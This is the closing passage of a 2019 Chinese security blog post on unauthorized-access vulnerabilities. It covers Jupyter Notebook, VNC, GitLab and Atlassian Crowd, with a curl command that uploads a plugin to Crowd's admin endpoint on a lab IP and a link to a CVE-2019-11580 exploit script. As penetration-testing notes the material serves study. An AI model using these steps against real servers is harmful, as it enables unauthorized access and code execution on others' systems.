&#x5982;&#x679C;&#x7BA1;&#x7406;&#x5458;&#x672A;&#x4E3A;Jupyter Notebook&#x914D;&#x7F6E;&#x5BC6;&#x7801;&#xFF0C;&#x5C06;&#x5BFC;&#x81F4;&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;&#xFF0C;
&#x6E38;&#x5BA2;&#x53EF;&#x5728;&#x5176;&#x4E2D;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;console&#x5E76;&#x6267;&#x884C;&#x4EFB;&#x610F;Python&#x4EE3;&#x7801;&#x548C;&#x547D;&#x4EE4;&#x3002;

&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6D4B;&#x8BD5;
&#x8BBF;&#x95EE; http://192.168.18.129:8888
&#x5229;&#x7528;terminal&#x547D;&#x4EE4;&#x6267;&#x884C;
New &gt; Terminal &#x521B;&#x5EFA;&#x63A7;&#x5236;&#x53F0;</code></pre><h2 id="VNC-&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;"><a href="#VNC-&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;" class="headerlink" title="VNC &#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;"></a>VNC &#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;</h2><pre><code>VNC &#x9ED8;&#x8BA4;&#x7AEF;&#x53E3;&#x53F7;&#x4E3A; 5900&#x3001;5901&#x3002;VNC &#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;&#x5982;&#x88AB;&#x5229;&#x7528;&#x53EF;&#x80FD;&#x9020;&#x6210;&#x6076;&#x610F;&#x7528;&#x6237;&#x76F4;&#x63A5;&#x63A7;&#x5236;target&#x4E3B;&#x673A;&#x3002;</code></pre><h2 id="GitLab"><a href="#GitLab" class="headerlink" title="GitLab"></a>GitLab</h2><pre><code>&#x4EFB;&#x610F;&#x7528;&#x6237;&#x6CE8;&#x518C;&#x540E;&#x53EF;&#x67E5;&#x770B;&#xFF0C;&#x4E0B;&#x8F7D;&#x9879;&#x76EE;&#x5185;&#x5BB9;</code></pre><h2 id="Atlassian-Crowd-&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;"><a href="#Atlassian-Crowd-&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;" class="headerlink" title="Atlassian Crowd &#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;"></a>Atlassian Crowd &#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6F0F;&#x6D1E;</h2><pre><code>&#x653B;&#x51FB;&#x8005;&#x5229;&#x7528;&#x8BE5;&#x6F0F;&#x6D1E;&#x53EF;&#x5728;&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x5BF9;Atlassian Crowd&#x548C;Crowd Data Center&#x5B89;&#x88C5;&#x4EFB;&#x610F;&#x7684;&#x6076;&#x610F;&#x63D2;&#x4EF6;&#xFF0C;&#x6267;&#x884C;&#x4EFB;&#x610F;&#x4EE3;&#x7801;/&#x547D;&#x4EE4;&#xFF0C;&#x4ECE;&#x800C;&#x83B7;&#x5F97;&#x670D;&#x52A1;&#x5668;&#x6743;&#x9650;&#x3002;
&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x6D4B;&#x8BD5;
&#x8FDB;&#x884C;&#x4E0A;&#x4F20;&#x4E00;&#x4E2A;&#x6807;&#x51C6;&#x7684;&#x63D2;&#x4EF6;&#xFF0C;&#x6765;&#x81EA;atlassian-bundled-plugins&#x4E2D;&#x7684;applinks-plugin-5.4.12.jar

curl --form &quot;file_cdl=@applinks-plugin-5.4.12.jar&quot; http://192.168.18.138:8095/crowd/admin/uploadplugin.action -v

Atlassian Crowd RCE
&#x6F0F;&#x6D1E;&#x5229;&#x7528;&#x811A;&#x672C;github&#x5730;&#x5740;&#xFF1A;https://github.com/jas502n/CVE-2019-11580</code></pre>
                        
                    </div>

                    
                    
                    

                    <div class="description post-description">
    <span class="post-description-item">
        <time datetime="2019-08-28T02:33:17.000Z" itemprop="datePublished">2019-08-28</time>

    </span>
    <span class="post-description-item">
        

    <span>
        <i class="tags icon"></i>
    </span>

    
    <span class="ui tiny label">
        <a href="/tags/web安全/">web安全</a>
    </span>

    

    </span>
</div>

                </div>
                
                <div id="pagination" class="nav-web ui text container pagination">

    <div class="ui stackable two column divided grid container">
        <div class="row">
            <div class="column nav-left">
                

                <a class="ui tiny button disabled"><i class="angle left icon"></i>Previous</a>

                
            </div>
            <div class="column nav-right">
                

                <a href="/2019/08/26/代码审计tips/" class="ui tiny button">
                    
                    代码审计tips
                    
                    <i class="angle right icon"></i></a>
                
            </div>
        </div>
    </div>

</div>
                
            </div>

            
            <div class="three wide computer three wide tablet column">

                <div class="ui sticky article-toc" id="article-toc">
                    <!-- toc -->
                    <ol class="ui ordered list"><li><a href="#Redis-未授权访问漏洞"><span>Redis 未授权访问漏洞</span></a></li><li><a href="#MongoDB-未授权访问漏洞"><span>MongoDB 未授权访问漏洞</span></a></li><li><a href="#Jenkins-未授权访问漏洞"><span>Jenkins 未授权访问漏洞</span></a></li><li><a href="#Memcached-未授权访问漏洞"><span>Memcached 未授权访问漏洞</span></a></li><li><a href="#JBOSS-未授权访问漏洞"><span>JBOSS 未授权访问漏洞</span></a></li><li><a href="#Docker-未授权访问漏洞"><span>Docker 未授权访问漏洞</span></a></li><li><a href="#ZooKeeper-未授权访问漏洞"><span>ZooKeeper 未授权访问漏洞</span></a></li><li><a href="#Rsync-未授权访问漏洞"><span>Rsync 未授权访问漏洞</span></a></li><li><a href="#CouchDB-未授权访问漏洞"><span>CouchDB 未授权访问漏洞</span></a></li><li><a href="#Elasticsearch-未授权访问漏洞"><span>Elasticsearch 未授权访问漏洞</span></a></li><li><a href="#Hadoop-未授权访问漏洞"><span>Hadoop 未授权访问漏洞</span></a></li><li><a href="#Jupyter-Notebook-未授权访问漏洞"><span>Jupyter Notebook 未授权访问漏洞</span></a></li><li><a href="#VNC-未授权访问漏洞"><span>VNC 未授权访问漏洞</span></a></li><li><a href="#GitLab"><span>GitLab</span></a></li><li><a href="#Atlassian-Crowd-未授权访问漏洞"><span>Atlassian Crowd 未授权访问漏洞</span></a></li></ol>
                </div>

            </div>
            

        </div>
    </div>
</div>


                    <!--</div>-->
                <!--</div>-->
            <!--</div>-->
        </div>
        <div class="ui vertical footer segment">
    <div class="ui center aligned container">
        <div class="ui inverted section divider"></div>
        &copy; 2019 <a href="/">热爱生活、热爱学习</a>,
        Powered by <a href="https://github.com/henryhuang/hexo-theme-aloha" target="_blank">Aloha</a> and <a href="http://hexo.io/" target="_blank">Hexo</a>.
    </div>
</div>

    </div>




<!-- scripts list from theme config.yml -->

<script src="//cdn.bootcss.com/jquery/3.1.0/jquery.min.js"></script>

<script src="//cdn.bootcss.com/semantic-ui/2.2.4/semantic.min.js"></script>

<script src="//cdn.bootcss.com/algoliasearch/3.18.1/algoliasearch.min.js"></script>

<script src="//cdn.bootcss.com/algoliasearch-helper-js/2.13.0/algoliasearch.helper.min.js"></script>

<script src="/js/semantic-ui-algolia.js"></script>

<script src="/js/aloha-events.js"></script>



</body>
</html>
